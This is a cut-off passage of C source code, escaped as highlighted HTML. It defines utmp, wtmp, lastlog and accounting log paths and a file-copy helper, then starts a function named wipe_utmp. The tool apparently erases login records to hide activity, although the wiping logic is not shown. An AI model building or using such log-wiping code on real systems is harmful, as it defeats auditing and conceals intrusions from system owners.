class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;utmp.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;fcntl.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;unistd.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;stdio.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;ctype.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;string.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;pwd.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;time.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;stdlib.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifdef HAVE_LASTLOG_H\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;lastlog.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifdef HAVE_UTMPX\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;utmpx.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * Try to use the paths out of the include files. \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * But if we can\u0026#39;t find any, revert to the defaults.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifndef UTMP_FILE\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifdef _PATH_UTMP\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#define UTMP_FILE\t_PATH_UTMP\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#else\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#define UTMP_FILE\t\u0026#34;/var/adm/utmp\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifndef WTMP_FILE\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifdef _PATH_WTMP\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#define WTMP_FILE\t_PATH_WTMP\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#else\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#define WTMP_FILE\t\u0026#34;/var/adm/wtmp\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifndef LASTLOG_FILE\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifdef _PATH_LASTLOG\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#define LASTLOG_FILE\t_PATH_LASTLOG\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#else\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#define LASTLOG_FILE\t\u0026#34;/var/adm/lastlog\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifndef ACCT_FILE\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#define ACCT_FILE\t\u0026#34;/var/adm/pacct\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifdef HAVE_UTMPX\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifndef UTMPX_FILE\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#define UTMPX_FILE\t\u0026#34;/var/adm/utmpx\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifndef WTMPX_FILE\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#define WTMPX_FILE\t\u0026#34;/var/adm/wtmpx\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif \u003c/span\u003e\u003cspan class=\"cm\"\u003e/* HAVE_UTMPX */\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#define BUFFSIZE\t8192\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e/* \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * This function will copy the src file to the dst file.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003ecopy_file\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003esrc\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003edst\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \t\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003efd2\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003eint\u003c/span\u003e\t\u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003echar\u003c/span\u003e\t\u003cspan class=\"n\"\u003ebuf\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eBUFFSIZE\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esrc\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eO_RDONLY\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Opening %s during copy.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esrc\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edst\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eO_WRONLY\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"n\"\u003eO_CREAT\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"n\"\u003eO_TRUNC\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Creating %s during copy.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edst\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ebuf\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eBUFFSIZE\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nf\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ebuf\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Write error during copy.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Read error during copy.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd2\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * UTMP editing.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003ewipe_utmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \t\t\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003eutmp\u003c/span\u003e\t\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 